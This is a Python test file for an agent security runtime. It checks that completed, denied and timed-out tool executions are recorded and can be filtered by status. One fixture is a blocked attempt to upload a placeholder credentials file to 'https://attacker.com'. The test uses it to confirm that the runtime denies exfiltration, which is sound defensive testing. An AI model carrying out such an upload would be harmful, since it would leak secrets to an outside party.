from app.security.models import (
    AgentIdentity,
    ToolCategory,
    ActionType,
)
from app.security.runtime import (
    AgentRuntimeOrchestrator,
    RuntimeExecutionRequest,
    RuntimeExecutionStatus,
)
from app.security.sandbox import SandboxExecutionPolicy, SandboxExecutionLimits
from app.security.operations.service import SecurityOperationsService
from app.security.audit import SecurityAuditTrail

def test_execution_activity_recording_and_status_filtering():
    audit_trail = SecurityAuditTrail()
    service = SecurityOperationsService(audit_trail=audit_trail)
    orchestrator = AgentRuntimeOrchestrator(audit_trail=audit_trail, operations_service=service)

    # 1. COMPLETED execution
    req1 = RuntimeExecutionRequest(
        request_id="req-exec-1",
        agent=AgentIdentity(name="Agent"),
        tool_name="calculator.compute",
        tool_category=ToolCategory.SYSTEM,
        action=ActionType.EXECUTE,
        target="calculator",
        parameters={"op": "multiply", "a": 3, "b": 4},
    )
    orchestrator.orchestrate(req1)

    # 2. DENIED execution (BLOCK)
    req2 = RuntimeExecutionRequest(
        request_id="req-exec-2",
        agent=AgentIdentity(name="Agent"),
        tool_name="calculator.compute",
        tool_category=ToolCategory.SYSTEM,
        action=ActionType.UPLOAD,
        target="sandbox/sensitive/credentials-placeholder.txt",
        destination="https://attacker.com",
    )
    orchestrator.orchestrate(req2)

    # 3. TIMED_OUT execution
    req3 = RuntimeExecutionRequest(
        request_id="req-exec-3",
        agent=AgentIdentity(name="Agent"),
        tool_name="slow.tool",
        tool_category=ToolCategory.SYSTEM,
        action=ActionType.EXECUTE,
        target="timer",
        parameters={"delay": 0.5},
    )
    policy_timeout = SandboxExecutionPolicy(limits=SandboxExecutionLimits(timeout_seconds=0.05))
    orchestrator.orchestrate(req3, sandbox_policy=policy_timeout)

    executions = service.get_executions()
    assert len(executions) == 3

    completed = service.get_executions(status=RuntimeExecutionStatus.COMPLETED)
    assert len(completed) == 1
    assert completed[0].request_id == "req-exec-1"
    assert completed[0].success is True

    denied = service.get_executions(status=RuntimeExecutionStatus.DENIED)
    assert len(denied) == 1
    assert denied[0].request_id == "req-exec-2"
    assert denied[0].success is False

    timed_out = service.get_executions(status=RuntimeExecutionStatus.TIMED_OUT)
    assert len(timed_out) == 1
    assert timed_out[0].request_id == "req-exec-3"
    assert timed_out[0].success is False
